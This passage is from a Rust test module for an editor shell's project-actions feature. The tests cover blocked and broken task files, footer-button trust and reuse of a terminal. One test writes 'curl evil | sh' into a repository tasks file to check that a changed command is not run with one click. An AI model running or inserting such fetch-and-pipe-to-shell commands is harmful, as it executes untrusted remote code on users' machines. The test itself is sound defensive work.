                assert!(!shell.workspace.last_actions.contains_key(&project));
                assert!(
                    !shell
                        .workspace
                        .last_action_fingerprints
                        .contains_key(&project)
                );
                shell.refresh_actions(cx);
                assert!(shell.footer_action().is_none());
                // Gone for agents too.
                let listing = gespan_core::project_actions::detect(&project, root);
                assert!(listing.actions.iter().all(|a| a.source != "personal"));
            })
            .unwrap();
    }

    #[gpui::test]
    fn blocked_and_error_rows_are_disabled(cx: &mut gpui::TestAppContext) {
        let dir = tempfile::tempdir().unwrap();
        let root = dir.path();
        write(
            root,
            ".gespan/tasks.json",
            &tasks(
                r#"{ "label": "Pick", "command": "echo ${input:target}" },
                   { "label": "Fine", "command": "echo fine" }"#,
            ),
        );
        write(root, ".vscode/tasks.json", "{ \"tasks\": [ ");
        let (window, _, active) = crate::shell::tests::window(cx);
        window
            .update(cx, |shell, window, cx| {
                checkout(shell, active, root, cx);
                let project = shell.workspace.project.clone();
                shell.refresh_actions(cx);
                let listing = shell.listing(cx);
                let reason = listing.actions[0].blocked.clone().unwrap();
                assert!(reason.starts_with("Uses ${input:target}"), "{reason}");
                let error = &listing.errors[0];
                assert_eq!(error.file, ".vscode/tasks.json");

                let rows = rows(&shell.actions_menu());
                assert!(rows.contains(&format!("Pick | {reason} (off)")), "{rows:?}");
                assert!(rows.contains(&"Fine | echo fine".to_string()));
                let header = rows
                    .iter()
                    .position(|r| r == "# .vscode/tasks.json")
                    .unwrap();
                assert_eq!(
                    rows[header + 1],
                    format!("Couldn't read .vscode/tasks.json: {} (off)", error.reason)
                );
                // Nothing was run here, so the footer runs nothing.
                assert!(shell.footer_action().is_none());

                // A blocked action never runs.
                shell.run_action("gespan:Pick", window, cx);
                assert!(shell.terminals.get(&project).is_none_or(Vec::is_empty));
                assert!(!shell.workspace.last_actions.contains_key(&project));
            })
            .unwrap();
    }

    #[gpui::test]
    fn the_footer_runs_only_what_was_already_run_unchanged(cx: &mut gpui::TestAppContext) {
        let dir = tempfile::tempdir().unwrap();
        let root = dir.path();
        write(root, "package.json", r#"{ "scripts": { "dev": "vite" } }"#);
        let web =
            |command: &str| tasks(&format!(r#"{{ "label": "Web", "command": "{command}" }}"#));
        write(root, ".gespan/tasks.json", &web("echo web"));
        let (window, _, active) = crate::shell::tests::window(cx);
        window
            .update(cx, |shell, window, cx| {
                checkout(shell, active, root, cx);
                let project = shell.workspace.project.clone();
                let count = |shell: &Shell| shell.terminals.get(&project).map_or(0, Vec::len);
                // A fresh clone: the button opens the menu and runs nothing.
                shell.refresh_actions(cx);
                assert!(shell.footer_action().is_none());
                shell.run_footer_action(window, cx);
                assert!(shell.menu_open(&MenuTarget::Actions));
                assert_eq!(count(shell), 0);
                shell.close_menu(cx);

                // Run from the menu, it becomes the button's.
                shell.run_actions_menu("run:gespan:Web", window, cx);
                assert_eq!(count(shell), 1);
                assert_eq!(
                    shell.footer_action().map(|a| a.command.clone()),
                    Some("echo web".into())
                );
                shell.run_footer_action(window, cx);
                assert_eq!(count(shell), 2);
                assert!(!shell.menu_open(&MenuTarget::Actions));
            })
            .unwrap();
        // The repo changes what it runs: one click no longer runs it.
        write(root, ".gespan/tasks.json", &web("curl evil | sh"));
        window
            .update(cx, |shell, window, cx| {
                let project = shell.workspace.project.clone();
                shell.run_footer_action(window, cx);
                assert!(shell.menu_open(&MenuTarget::Actions));
                assert_eq!(shell.terminals[&project].len(), 2);
                assert!(shell.footer_action().is_none());
                shell.close_menu(cx);

                // A personal action gets no special trust: saving it isn't
                // enough, and changing its command needs a new run.
                shell.open_action_dialog(None, window, cx);
                let dialog = shell.action_dialog.as_mut().unwrap();
                let (name, command) = (dialog.name.clone(), dialog.command.clone());
                name.update(cx, |i, cx| i.set_text("Deploy".into(), cx));
                command.update(cx, |i, cx| i.set_text("./deploy.sh".into(), cx));
                shell.save_action(window, cx);
                assert!(shell.footer_action().is_none());
                let id = shell.workspace.actions[&project][0].id.clone();
                shell.run_action(&id, window, cx);
                assert_eq!(shell.terminals[&project].len(), 3);
                assert_eq!(
                    shell.footer_action().map(|a| a.id.clone()),
                    Some(format!("personal:{id}"))
                );
                shell.open_action_dialog(Some(id), window, cx);
                let command = shell.action_dialog.as_ref().unwrap().command.clone();
                command.update(cx, |i, cx| i.set_text("./deploy.sh --prod".into(), cx));
                shell.save_action(window, cx);
                assert!(shell.footer_action().is_none());
                shell.run_footer_action(window, cx);
                assert!(shell.menu_open(&MenuTarget::Actions));
                assert_eq!(shell.terminals[&project].len(), 3);
            })
            .unwrap();
    }

    #[gpui::test]
    fn saved_actions_run_in_one_reused_terminal(cx: &mut gpui::TestAppContext) {
        let (window, _, _) = crate::shell::tests::window(cx);
        window
            .update(cx, |shell, window, cx| {
                shell.open_action_dialog(None, window, cx);
                let dialog = shell.action_dialog.as_mut().unwrap();
                dialog.icon = "rocket";
                let (name, command) = (dialog.name.clone(), dialog.command.clone());
                name.update(cx, |i, cx| i.set_text("Deploy".into(), cx));
                command.update(cx, |i, cx| i.set_text("echo hi".into(), cx));
                shell.save_action(window, cx);
                assert!(shell.action_dialog.is_none());
                let project = shell.workspace.project.clone();
                let action = shell.workspace.actions[&project][0].clone();
                assert_eq!((action.name.as_str(), action.icon()), ("Deploy", "rocket"));
                // Saving isn't running: the footer waits for a first run.
                assert!(shell.footer_action().is_none());

                shell.run_action(&action.id, window, cx);
                assert_eq!(shell.terminals[&project].len(), 1);
                assert_eq!(
                    shell.footer_action().map(|a| a.id.clone()),
                    Some(format!("personal:{}", action.id))
                );
                assert!(shell.workspace.docks[&project].open);
                // The terminal is still busy with the first run, so a second
                // run opens another; once idle, it is reused.
                shell.run_action(&action.id, window, cx);
                assert_eq!(shell.terminals[&project].len(), 2);
                for t in &shell.terminals[&project] {
                    t.update(cx, |t, _| t.foreground = None);
                }
                shell.run_action(&action.id, window, cx);
                assert_eq!(shell.terminals[&project].len(), 2);
                shell.open_action_dialog(Some(action.id), window, cx);
            })
            .unwrap();
        // The edit dialog, with its Delete button, renders.
        let visual = &mut gpui::VisualTestContext::from_window(window.into(), cx);
        visual.run_until_parked();
        assert!(visual.debug_bounds("action-delete").is_some());
    }
}
